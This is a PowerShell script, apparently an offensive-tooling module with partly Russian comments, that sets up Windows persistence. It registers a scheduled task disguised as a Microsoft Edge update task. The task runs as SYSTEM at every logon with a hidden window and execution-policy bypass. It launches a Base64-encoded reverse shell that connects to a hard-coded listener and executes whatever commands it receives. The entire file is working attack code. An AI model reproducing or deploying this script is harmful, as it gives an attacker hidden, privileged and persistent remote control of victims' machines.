<#
.SYNOPSIS
    L7 Offensive Module: Scheduled Task Persistence with Real Reverse Shell
.DESCRIPTION
    Injects a Base64-encoded PowerShell reverse shell into the Windows Task Scheduler.
    Executes under the highly privileged SYSTEM account upon user logon.
    Masquerades as a Microsoft Edge update task.
#>

Write-Host "[*] Initiating Persistence Module (Scheduled Task)..." -ForegroundColor Yellow

$TaskName = "MicrosoftEdgeUpdateTaskMachineCore"

# =========================================================================
$LHOST = "192.168.182.137" 
$LPORT = 4444
# =========================================================================

# Классический PowerShell Reverse Shell (One-liner). 
# Используем одинарные кавычки для предотвращения преждевременного раскрытия переменных.
$RawCommand = "`$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"

# Кодируем в Base64 (UTF-16LE is required by PowerShell for -EncodedCommand)
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($RawCommand)
$EncodedPayload = [Convert]::ToBase64String($Bytes)

Write-Host "[*] Encoded Payload generated." -ForegroundColor DarkGray

# Создаем задачу, которая запустит закодированный шелл от имени SYSTEM
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $EncodedPayload"
$Trigger = New-ScheduledTaskTrigger -AtLogOn

try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -User "NT AUTHORITY\SYSTEM" -RunLevel Highest -Force | Out-Null
    Write-Host "[+] Persistence established. Task '$TaskName' registered successfully." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to establish persistence: $_" -ForegroundColor Red
}